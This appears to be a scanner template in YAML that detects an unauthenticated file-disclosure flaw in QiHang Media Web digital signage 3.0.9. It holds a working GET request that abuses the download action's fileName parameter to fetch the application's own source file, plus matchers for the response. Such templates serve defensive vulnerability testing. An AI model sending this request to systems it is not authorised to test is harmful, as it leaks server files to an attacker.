id: qihang-media-lfi
brief:
    title: QiHang Media Web (QH.aspx) Digital Signage 3.0.9 - Arbitrary File Disclosure
    by: gy741
    level: high
    about: The QiHang Media Web application suffers from an unauthenticated file disclosure vulnerability when input passed thru the filename parameter when using the download action or thru path parameter wh...
    label:
        - qihang
        - lfi
        - disclosure
        - vuln
    score: CVSS:8.6
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx'
      head:
        Connection: close
      signs:
        - "on": word
          has:
            - filename=QH.aspx
            - application/zip
          in: header
          need: all
        - "on": word
          has:
            - QH.aspx.cs
            - QiHang.Media.Web.QH
          in: body
          need: all
        - "on": status
          status:
            - 200
